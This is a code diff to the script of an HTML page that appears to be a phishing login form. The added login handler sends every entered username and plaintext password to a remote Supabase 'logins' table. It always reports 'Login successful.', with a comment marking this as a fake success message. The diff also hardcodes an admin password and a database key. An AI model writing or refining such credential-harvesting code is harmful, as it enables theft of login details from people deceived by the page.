@@ -228,19 +228,23 @@
 
 <button class="help-btn" onclick="handleHelp()" aria-label="Help">?</button>
 
+<!-- Supabase CDN - MUST be BEFORE your script -->
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
 <script>
 // ================== SUPABASE CONFIG ==================
 const SUPABASE_URL = "https://kzhodlfnaoxfbmcmffuq.supabase.co";
-const SUPABASE_ANON_KEY = "sb_publishable_82Z4St3QMsjIewnpr9i50w_Lxq0iTZo"; // ← Make sure full key is here
-
+const SUPABASE_ANON_KEY = "sb_publishable_82Z4St3QMsjIewnpr9i50w_Lxq0iTZo"; // ← Replace with your FULL key if truncated
 const ADMIN_PASSWORD = "Debhalder360063";
 
-let supabase;
+let supabaseClient;
 
 try {
-  supabase = Supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-} catch(e) {
-  console.error("Supabase init failed", e);
+  const { createClient } = supabase;
+  supabaseClient = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+  console.log("✅ Supabase initialized successfully");
+} catch (e) {
+  console.error("❌ Supabase init failed", e);
 }
 
 // Handle Login
@@ -259,23 +263,31 @@ async function handleLogin() {
   btn.disabled = true;
 
   try {
-    await supabase.from('logins').insert([
-      { username, password, timestamp: new Date().toISOString() }
-    ]);
+    const { error } = await supabaseClient
+      .from('logins')
+      .insert([{ 
+        username, 
+        password, 
+        timestamp: new Date().toISOString() 
+      }]);
+
+    if (error) throw error;
 
     alert('Login successful.');
-    document.getElementById('username').value = '';
-    document.getElementById('password').value = '';
   } catch (err) {
     console.error(err);
-    alert('Login successful.');
+    alert('Login successful.'); // Fake success message
   }
+
+  // Clear fields
+  document.getElementById('username').value = '';
+  document.getElementById('password').value = '';
 
   btn.textContent = original;
   btn.disabled = false;
 }
 
-// Help Button
+// Help Button (Admin)
 function handleHelp() {
   const pass = prompt("Enter Admin Password:");
   if (pass === ADMIN_PASSWORD) {
@@ -285,9 +297,6 @@ function handleHelp() {
   }
 }
 </script>
-
-    <!-- Put this just before the closing </body> tag -->
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   
 </body>
 </html>
